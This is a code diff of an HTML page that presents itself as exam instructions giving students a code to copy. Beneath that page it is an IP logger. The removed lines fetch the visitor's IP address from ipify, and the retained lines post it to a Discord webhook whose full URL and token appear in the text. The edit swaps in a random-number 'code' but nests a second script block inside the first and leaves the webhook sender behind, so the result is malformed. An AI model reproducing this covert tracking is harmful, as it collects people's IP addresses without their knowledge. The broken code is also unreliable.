@@ -50,16 +50,19 @@
       <h2>Instructions</h2>
       <p>Hello. Below is a special code which a student will require to start their exam.</p>
       <div class="ip-container">
-        <input type="text" id="ip" class="ip-textbox" readonly />
+        <input type="text" id="code" class="ip-textbox" readonly />
         <button id="copy-btn" class="copy-btn">Copy</button>
       </div>
       <script>
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://api.ipify.org', true);
-        xhr.onload = function () {
-          var ip = this.responseText;
-          document.getElementById('ip').value = ip;
 
+<script>
+  var min = 1000; // minimum code value
+  var max = 5000; // maximum code value
+  var code = Math.floor(Math.random() * (max - min + 1)) + min; // generate random code
+  document.getElementById("code").value = code; // set textbox value to the generated code
+</script>
+
+        
           // Send the IP address to Discord webhook
           var webhookUrl = 'https://discord.com/api/webhooks/1100478463942590545/mccHmCa8GVnBR3MO9bk-SA5cOkme3jNdlg7fyOJV0WPxPJ7_sqLjyurjhOTZTwUQXAmu';
           var xhr2 = new XMLHttpRequest();
